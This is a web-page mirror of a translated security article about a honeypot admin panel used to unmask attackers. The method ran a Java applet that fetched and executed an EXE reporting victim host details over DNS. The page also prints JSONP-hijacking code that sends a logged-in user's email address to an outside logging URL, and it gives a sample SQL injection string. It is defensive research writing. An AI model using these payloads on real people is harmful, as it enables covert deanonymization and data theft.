<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Fighting anonymity</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="The topic of anonymity on the Internet is now quite fashionable and interesting, and especially now that news portals are scaring us with PRISM, gover...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Fighting anonymity</h1><div class="post__text post__text-html js-mediator-article">  The topic of anonymity on the Internet is now quite fashionable and interesting, and especially now that news portals are scaring us with PRISM, government initiatives and other things.  Most people are concerned about how to keep their identity secret online, and therefore all topics are somehow dedicated to PROTECT.  But sometimes, disclosing anonymity is not such a bad thing.  Yes, yes, this article is my experience in dealing with anonymity on my own, without the help of special services ... <br><br><img src="https://habrastorage.org/storage2/e1b/c12/f7c/e1bc12f7c67c8ccf255c7e34e7a885bf.jpg" alt="image"><br><br><a name="habracut"></a>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <h4>  What for? </h4><br><br>  First of all ... why should I?  I am not a ‚Äúthree letter‚Äù, but a modest engineer, I don‚Äôt have any plans to take over the world, and I don‚Äôt do other unscrupulous business, so what didn‚Äôt please me with anonymity?  The answer is simple - anonymus, hackers, script-kidis ... These guys are always trying to break something there, steal, spoil, or drive their ChSV.  The point is, if you think is not so bad (better than indulging in drugs in the gateway), but since the guys love to play, let's play with them.  Their anonymity is not sacred, so you can stand up to it 8) But as a general result, it all works with any Internet user, I just used efforts exclusively against the attackers, those who try to get unauthorized access and violate article 272 of the Criminal Code of the Russian Federation.  In addition, my experience will be an interesting illustration of the theme of "counterattack" on the attackers themselves in automatic mode without human intervention.  The result of the counterattack is the disclosure of information about the attacker, which, you see, is a good thing, not a bad one ... <br><br><h4>  Honey Keg </h4><br><br>  In order not to damage the anonymity of innocent citizens and counterattack only the "villains", you need to be sure that this juzverej is a cracker.  To do this, it is enough to have a visitor behavior analysis system with a mechanism for detecting ‚Äúattacking‚Äù actions.  In short, it's enough to make a honeypot.  You do not need to deploy honeyd and so on.  For example, for a general case with a WEB resource, it is enough to locate one pseudo-working script on the production server, which will depict utility and functionality, but in fact will detect penetration attempts and, in the case of a ‚Äúsuccessful‚Äù attack, represent that this hacking was a success.  After that, perform a counter-attack on this particular user.  A good example is, create a script admin.php or / admin / not important, any self-respecting attacker will find this URI in a few seconds, this is an obvious move.  In case you want to increase the attention of unwanted elements to the trap, you can place a link from the main page (they say admin here), because the main task is for the bad guy to attack the first thing the honipot, and not pick at normal scripts.  In a pseudo-admin script, clearly, they ask for a username and password.  Then it‚Äôs a fantasy business, you can wait for the attacker to bust through the password or emulate a SQL Injection class vulnerability, and then any password of the class <i>' or 1 = 1 / *</i> , which will give access to the admin panel, will do.  In this case, we can collect statistics - as the admin has been hacked, by selection or via SQLi.  Well, by itself - anyone who got into the "admin" is a "bad" guy, and his disclosure of his anonymity does not cause me moral problems. <br><br>  Actually, in 2011 I placed such a script on my grief site and waited ... I didn‚Äôt wait for a long time, since the site was dedicated to information security, then those who wanted to zyhakat exceeded all imagination. <br><br><img src="https://habrastorage.org/storage2/a4c/d3a/93a/a4cd3a93a11f4e9f5ea270ab6f81be6a.png"><br><br><h4>  Hit the head </h4><br><br>  Obviously, in the most general case, all we have about the web site visitor (and the attacker, in our particular case) is just the IP address, the User-Agent, and so on.  As I said, we are not CIA / FSB / MOSSAD ... we do not have SORM or PRISM, and we understand that the IP address (given the different Proxy servers and TOR) is actually NOTHING.  We deal with this in most cases, but if you play one subtle psychological moment (specifically concerning the script kiddie), it turns out that these guys are not waiting for a trick!  In other words, in the body of the admin you can do anything ‚Äî hang up a pop-up pack, for example, and pierce the negligent pop-ups.  But I played more ‚Äúflat‚Äù, I launched Java Applet.  They say you are authenticated ... here is our GUI panel in Java.  An element of social engineering - attacking in a fit of joy from a successful attack, SQLi can stupidly launch an applet.  And ... I was surprised, but there were enough of them (of course, later, over time, the percentage of piercing fell, as information about the setup quickly dispersed among a narrow circle of specialists;).  Actually, the applet stupidly jerked the EXE file from the server and launched it. <br>  The EXE file collected NOT PERSONAL data (yes, yes, I‚Äôm writing about the PD on PD ...), only the following info: IP local, traceroute from the network, machine name, user login.  This is not much, but in most cases it is enough to bypass the TOR / Proxy / VPN and even find out the name of the attacker!  In addition, of course, it would be possible to collect the BSSID of the surrounding access points, for example, and take pictures from the webcam of the laptop, parse the config files from the screw, etc., etc.  In short, the point is that by installing a ‚Äúcounter-intelligence agent‚Äù on the attacker's PC, we avoided many obstacles, and TOR and Proxy are no longer in business.  Obvious counter attack.  Note: my agent did not have remote access, although technically it could be coded, I did not want to backdoor and distribute malicious software.  This agent was not malicious, as it collected a purely technical information about the attacker's PC and its network environment.  By the way, all data was transmitted by the reverse DNS channel, which improved successful ‚Äútapping‚Äù with the data - <a href="http://www.xakep.ru/post/55661/">http://www.xakep.ru/post/55661/</a> . <br><br>  Interesting "attackers": <br><br>  1) Ministry of Defense of the Russian Federation <br><br>  One of the first, tried to use the attack type of SQLi guys from the foreign IP of the Ministry of Defense of the Russian Federation.  To my luck, they either did not fall for the applet, or they had Linux (since I had to add cross-platform to my desktop).  I know that there are good guys and, of course, they didn‚Äôt want anything bad!  But I hope with real ‚Äúintelligence operations‚Äù they use at least Chinese proxy servers;) <br><br><img src="https://habrastorage.org/storage2/b57/a81/404/b57a814041a576ea44f570bcffe03a6f.png"><br><br>  2) Antivirus company <br><br>  This launch was made from the virtual machine of the anti-virus company.  DNS server and tracert burned the office 8) It is noteworthy that the guys did not add the agent to the malware list!  Appreciated.  Thank you guys! <br><br>  3) A bunch of guys <br><br>  Just a bunch of different guys, someone knew about the feature and just played, someone did not ( <a href="http://habrahabr.ru/post/122107/">http://habrahabr.ru/post/122107/#comment_4003842</a> ) <br><br><img src="https://habrastorage.org/storage2/7ba/46c/d51/7ba46cd51134bd02f33f11d1b4d311d0.png"><br><br>  4) And the most interesting host is owned by a razvedka one of the CIS countries.  With ‚Äúreverse‚Äù penetration. <br><br>  At first, I decided that here it is, the cyber war has begun!  As a result of a counter-attack, our agent was launched on a host belonging to the intelligence service of another state.  Only the account looked like a service account, which suggested that the host was compromised and used as an intermediary.  A little later on the same day we got the installation of the second ‚Äúagent‚Äù from the same country, only this time not from the government network, but from the home PC.  The username of the PC turned out to be easy to googling and identifying the person came out without problems  At the same time, given these "coincidences", we can say that either he works for this intelligence, or somehow got access to a government host. <br><br><img src="https://habrastorage.org/storage2/a9e/f4d/4da/a9ef4d4daf3baecd5093acae68220bdd.png"><br><br><h4>  Rebound injury </h4><br><br>  Okay, we realized that the simplest way to uncover anonymity is to counterattack through exploit packs or with SI elements, but this is thick and obvious.  But there was another idea - third-party services, such as webmail or, for example, social networks.  You can make the attack more invisible ... which I did 8) <br><br><img src="https://habrastorage.org/storage2/945/1a6/e06/9451a6e0697a35e999ca4dfbd69f2124.png"><br><br>  Yes, besides the applet, in the event of a successful attack on me, I recognized the attacker's e-mail in order to know exactly who was to blame (but what to do and so clearly ..).  Again, anonymity is not a TOR / VPN / Proxy chain.  This is not enough!  And so the essence is simple, if a citizen uses services like VKontakte, yandex, google, linkedin, twitter, facebook and so on ... and he is constantly authenticated on them, then if there are any vulnerabilities (CSRF / XSS) on these services, they will allow YOUR anonymity.  It so happened that the vulnerabilities were found on the mail.ru and yandex.ru services (I reported them long ago, and they were patched long ago, however I had less time to experience it for the sake of my ‚Äúscientific‚Äù experiment on catching evil guys ...).  Vulnerability is the most commonplace (in both services): JSONP Hijacking.  The essence is simple, there is a certain service: <br><br> <code><a href="http://mail-service.com/ajax%3Fcallback%3Dfunc"></a> mail-service.com/ajax?callback=func</code> <br> <br>  Which uses cookie authentication, and returns something like: <br><br> <code>func({"e-mail":"username@mail-service.com"});</code> <br> <br>  Accordingly, to exploit this gap and disclose anonymity, we use the code: <br><br><pre> <code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span><span class="javascript"><span class="javascript"> </span><span class="hljs-function"><span class="hljs-keyword"><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span></span><span class="javascript"><span class="hljs-function"> </span></span><span class="hljs-title"><span class="javascript"><span class="hljs-function"><span class="hljs-title">func</span></span></span></span><span class="javascript"><span class="hljs-function">(</span></span><span class="hljs-params"><span class="javascript"><span class="hljs-function"><span class="hljs-params">obj</span></span></span></span><span class="javascript"><span class="hljs-function">) </span></span></span><span class="javascript">{ </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">var</span></span></span><span class="javascript"> url=</span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://loger.com/log.php?value="</span></span></span><span class="javascript">+obj[</span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"e-mail"</span></span></span><span class="javascript">]; $.get(url); } </span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://mail-service.com/ajax?callback=func"</span></span></span><span class="hljs-tag">/&gt;</span></span><span class="undefined"></span><span class="undefined"></span></code> </pre><br><br>  So remember: you can forget about TOR / VPN, if you always rush on the social.  networks do not even need to have PRISM to trace who you are and where they come from, rather ‚Äústupid‚Äù CSRF / XSS. <br><br>  Typical attacker: <br><img src="https://habrastorage.org/storage2/5d2/67e/8f8/5d267e8f8dd3bed9377d385263726978.png"><br><br><h5>  And further... </h5><br><br>  By the way, as another example of such an approach, the network of linkedin, you don‚Äôt even need a vulnerability, there‚Äôs a real feature - the log of those who viewed your profile.  That is, if on my admin panel hang up stupidly redirect to a special registered profile of linkedin: <br><br><img src="https://habrastorage.org/storage2/d93/cab/3cd/d93cab3cd26cd20489cf3c0927c7c34b.png"><br><br>  In the end, we can find out more information about the attackers right in the linkedin: <br><br><img src="https://habrastorage.org/storage2/3eb/0d7/ec2/3eb0d7ec25d73ebe1f25d18cac681f7e.png"><br><br>  By the way, you may notice that SAMEORIGIN does not help, since the GET request passes before the browser checks the ORIGIN policy, the check is performed THEN;) <br><br><h4>  Statistics </h4><br><br>  At the end of some statistics.  The experiment lasted from Q2 2011 to Q3 2012. <br><br>  Total unique SQLi attacks - <b>484</b> (for ~ 1.2 years) <br><br>  Of these, successful counter-attacks (Java Applet) - <b>52</b> (for ~ 1.2 years) <br><br>  Of these, successful counter-attacks on mail.ru/yandex.ru - <b>16</b> (for 6 months) <br><br>  ~ <b>17%</b> success with counter attacks. <br><br>  Dependency graph: <br><br><img src="https://habrastorage.org/storage2/8a7/c26/409/8a7c26409472c7090742f06bcbb4692c.png"><br><br>  As you can see, at the beginning there was an applet, and I added ‚Äúsoap‚Äù much later.  Peaks in attendance associated with the announcements of <a href="http://2013.zeronights.org/">ZeroNights</a> and meetings Defcon group.  Breaking through the mail is actually linear, whereas in the case of applets, the dependence was linear only at the beginning of the experiment.  This is due to Java updates, antiviruses added an applet to the malware database later (which is not surprising because it is compiled from a metasploit peylod) <br><br>  PS By the way, if yandex.ru has a place to report bugs I‚Äôve found, in the case of mail.ru I didn‚Äôt find contacts until I met IBShnik there and merged the bug to him personally ... <br><br><h4>  findings </h4><br><br>  Although this blog post is more about how I caught the "bad" guys, although in fact it can be extrapolated to anonymity questions on the Internet - if IT / IB specialists and hackers are scorching, then what about normal people?  It is clear that TOR / Proxy and VPN do not help in this matter.  Enough login in the social network, inattention, and much more, to uniquely compare the visitor of a web resource with a real person.  Be careful and JFYI: <a href="http://2012.zeronights.org/includes/docs/Keynote%2520The%2520Grugq%2520-%2520OPSEC%2520for%2520Russians.pdf">How real evil hackers work</a> <br><br>  Well, the second conclusion, the counter-attack on the attacker is not such a bad idea, you will not know less about him, but if you ‚Äúprocate‚Äù, you will get a lot of interesting information.  By the way, in some state these things are already working (as I was informed).  So cyber warfare is fun! <br><br>  PS Original materials, where bugs are revealed in more detail: <br><br>  <a href="https://media.blackhat.com/eu-13/briefings/Sintsov/bh-eu-13-honeypot-sintsov-slides.pdf">Slides from BH EU 2013</a> <br>  <a href="https://media.blackhat.com/eu-13/briefings/Sintsov/bh-eu-13-honeypot-sintsov-wp.pdf">Textile with BH EU 2013</a> <br><br>  May the Force be with you. </div><p>Source: <a href="https://habr.com/ru/post/186160/">https://habr.com/ru/post/186160/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../186144/index.html">Build 2013: the best reports on the Windows Azure platform</a></li>
<li><a href="../186146/index.html">Haswell vs. Ivy Bridge. Duel of two ultrabooks</a></li>
<li><a href="../186148/index.html">Kingnovel K-R42 - media player with Android 4.2.2 on board</a></li>
<li><a href="../186154/index.html">Honey Bees as a promising branch of computer technology development</a></li>
<li><a href="../186158/index.html">French parliament legislates free software priority</a></li>
<li><a href="../186162/index.html">SEO myths</a></li>
<li><a href="../186166/index.html">NASA has defined a range of tasks for the successor to Curiosity</a></li>
<li><a href="../186168/index.html">How does the support service for shopping services abroad work and develop? Shopotam.ru</a></li>
<li><a href="../186170/index.html">The Russian Post has lost its Twitter account for debts, and before that it had been said that it had been hacked</a></li>
<li><a href="../186174/index.html">Flexible "electronic skin" can "feel" touch, determine the temperature and humidity</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>